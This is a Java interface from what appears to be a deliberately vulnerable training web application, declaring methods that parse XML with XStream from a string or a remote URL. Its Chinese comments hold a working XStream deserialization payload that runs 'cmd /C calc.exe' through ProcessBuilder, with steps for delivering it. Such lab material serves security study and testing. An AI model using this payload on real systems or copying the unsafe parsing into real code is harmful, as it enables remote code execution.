package cn.bestsec.vulweb.service;

/**
 * XStream漏洞代码片段
 */
public interface XStreamVulService {
    /**
     * 可用的payload:
     * <sorted-set>
     *     <string>foo</string>
     *     <dynamic-proxy>
     *         <interface>java.lang.Comparable</interface>
     *         <handler class="java.beans.EventHandler">
     *             <target class="java.lang.ProcessBuilder">
     *                 <command>
     *                     <string>cmd</string>
     *                     <string>/C</string>
     *                     <string>calc.exe</string>
     *                 </command>
     *             </target>
     *             <action>start</action>
     *         </handler>
     *     </dynamic-proxy>
     * </sorted-set>
     */
    /**
     * 使用xstream解析xml为对象
     * @param xml xml字符串
     * @return 解析结果
     * 验证方式：将上述payload直接发送到该方法
     */
    String fromXML(String xml);

    /**
     * 从url读取远程xml文档
     * @param url 远程xml文档地址
     * @return 解析结果
     * 将上述payload以文本文件的形式存放在其他web服务器上，并传递那个文本文件的url地址到当前方法
     */
    String fromURL(String url);

    /**
     * 从url读取远程xml文档（stream方式）
     * @param url 远程xml文档地址
     * @return 解析结果
     * 将上述payload以文本文件的形式存放在其他web服务器上，并传递那个文本文件的url地址到当前方法
     */
    String fromStream(String url);
}
